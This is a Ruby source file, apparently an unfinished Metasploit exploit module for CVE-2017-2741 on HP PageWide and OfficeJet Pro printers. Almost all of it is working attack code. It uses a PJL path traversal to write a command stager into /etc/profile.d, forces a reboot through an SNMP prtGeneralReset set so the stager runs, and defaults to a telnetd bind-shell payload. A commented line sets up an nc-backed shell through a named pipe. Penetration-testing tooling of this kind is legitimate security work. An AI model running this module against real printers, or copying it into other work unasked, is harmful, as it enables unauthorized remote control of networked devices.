##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require "rex/proto/pjl"

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP PageWide and OfficeJet Pro Printer PJL Arbitrary Code Execution',
      'Description'    => %q{
        TODO
      },

      'Author'         => [
        'Jacob Baines', # Python PoC
        'Matthew Kienow <matthew_kienow[AT]rapid7.com>', # Metasploit module
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-2741' ],
          [ 'URL', 'https://support.hp.com/lt-en/document/c05462914' ],
          [ 'URL', 'http://tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution' ]
        ],

      # TODO: should there be target entries for all vuln printers?
      # 'Targets'        =>
      #   [
      #     [ 'HP PageWide Managed MFP P57750dw', {} ],
      #     [ 'HP PageWide Managed P55250dw', {} ],
      #     [ 'HP PageWide Pro MFP 577z', {} ],
      #     [ 'HP PageWide Pro 552dw', {} ],
      #     [ 'HP PageWide Pro MFP 577dw', {} ],
      #     [ 'HP PageWide Pro MFP 477dw', {} ],
      #     [ 'HP PageWide Pro 452dw', {} ],
      #     [ 'HP PageWide Pro MFP 477dn', {} ],
      #     [ 'HP PageWide Pro 452dn', {} ],
      #     [ 'HP PageWide MFP 377dw', {} ],
      #     [ 'HP PageWide 352dw', {} ],
      #     [ 'HP OfficeJet Pro 8730 All-in-One Printer', {} ],
      #     [ 'HP OfficeJet Pro 8740 All-in-One Printer', {} ],
      #     [ 'HP OfficeJet Pro 8210 Printer', {} ],
      #     [ 'HP OfficeJet Pro 8216 Printer', {} ],
      #     [ 'HP OfficeJet Pro 8218 Printer', {} ]
      #   ],
      # 'Targets'         => [ [ 'Linux', {} ] ],
      'Targets'        => [
        ['Unix (In-Memory)',
          'Platform'   => 'unix',
          'Arch'       => ARCH_CMD,
          'Payload'        =>
             {
                 'Compat'      =>
                     {
                         'PayloadType' => 'cmd',
                         'RequiredCmd' => 'telnetd'
                     }
             },
        ],
        ['Linux (Dropper)',
          'Platform'   => 'linux',
          'Arch'       => ARCH_ARMLE
        ]
      ],
      'Privileged'     => true,
      # 'Platform'       => 'linux',
      # 'Arch'           => [ARCH_ARMLE],
      'DisclosureDate' => 'Apr 05 2017',
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
          'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd',
          'WfsDelay' => 180
      }
    ))

    register_options([
      Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
      OptString.new('RPATH', [true, 'Remote path', '0:/../../rw/var/etc/profile.d/']),
      OptString.new('PRT_GENERAL_RESET', [ true, 'Printer MIB prtGeneralReset object identifier (numeric notation)', '1.3.6.1.2.1.43.5.1.1.3.1']),
      OptInt.new('PRT_GENERAL_RESET_VALUE', [ true, 'Integer value used to set prtGeneralReset; cold start via powerCycleReset(4)', 4])
    ])
  end

  def execute_command(cmd, opts = {})
    # inject whatever is in the cmd variable to the vulnerable code
    print_status("cmd = #{cmd}") # TODO: remove

    # profile_d_script = 'if [ ! -p /tmp/pwned ]; then\n''\tmkfifo /tmp/pwned\n'\
    #                    '\tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &\n'\
    #                    'fi\n'

    # stager_script = Rex::Text.rand_text_alpha(8) + ".sh"
    stager_script = "stagercmd.sh"
    cmd = "(cd / && #{cmd}); rm -f /etc/profile.d/#{stager_script}"
    print_status("cmd = #{cmd}") # TODO: remove

    begin
      rpath = datastore['RPATH']
      prt_general_reset = datastore['PRT_GENERAL_RESET']
      prt_general_reset_value = datastore['PRT_GENERAL_RESET_VALUE']
      community = datastore['COMMUNITY']

      # use PJL to write command stager
      print_status("Connecting to port #{rport}...")

      connect()
      pjl = Rex::Proto::PJL::Client.new(sock)
      pjl.begin_job

      pjl.fsinit(rpath[0..1])

      print_status("Attempting to write command stager...")
      rpath = rpath + stager_script
      if pjl.fsdownload(cmd, rpath, is_file: false)
        print_good("Successfully wrote command stager to #{rpath}")
      else
        print_bad("Failed to write command stager to #{rpath}")
        return
      end

      # verify command stager exists
      unless pjl.fsquery(rpath)
        print_bad("Command stager does not exist at #{rpath}; aborting...")
        return
      end

      pjl.end_job

      # use SNMP to restart printer
      datastore['RPORT'] = 161 # TODO: fix module's use of two different RPORT values
      snmp = connect_snmp

      print_status("Connecting to port #{rport}...")

      # get value of Printer MIB prtGeneralReset
      check = snmp.get_value(prt_general_reset)
      check = "''" if check.to_s =~ /Null/
      # TOOD: remove - note notResetting(3)
      print_status("Initial value of prtGeneralReset OID #{prt_general_reset} => #{check}")

      # set value of Printer MIB prtGeneralReset to powerCycleReset(4)
      print_status("Attempting to restart printer via SNMP...")
      varbind = SNMP::VarBind.new(prt_general_reset, SNMP::Integer.new(prt_general_reset_value))
      resp = snmp.set(varbind)

      if resp.error_status == :noError
        print_status("Set prtGeneralReset OID #{prt_general_reset} => #{prt_general_reset_value}")

        # get value of Printer MIB prtGeneralReset
        check = snmp.get_value(prt_general_reset)
        check = "''" if check.to_s =~ /Null/
        print_status("Current value of prtGeneralReset OID #{prt_general_reset} => #{check}")
        print_status("Printer restarting...")

      else
        print_status("prtGeneralReset OID #{prt_general_reset} not writable or does not provide WRITE access with community '#{community}'")
      end

    rescue ::SNMP::RequestTimeout
      print_error("SNMP request timeout with community '#{community}'.")
      raise
    rescue ::Rex::ConnectionError
      print_error("Connection Refused")
      raise
    rescue SNMP::UnsupportedVersion
      print_error("Unsupported SNMP version specified. Select from '1' or '2c'.")
      raise
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
      raise
    rescue
      print_error("Error in connection or socket")
      raise
    end
  end

  def exploit
    begin
      print_status("Exploiting...")
      if target.name =~ /Unix/
        execute_command(payload.encoded)
      else
        execute_cmdstager()
        # execute_cmdstager({:temp => "/var/tmp"})
      end

      return
    ensure
      disconnect()
    end
  end

end
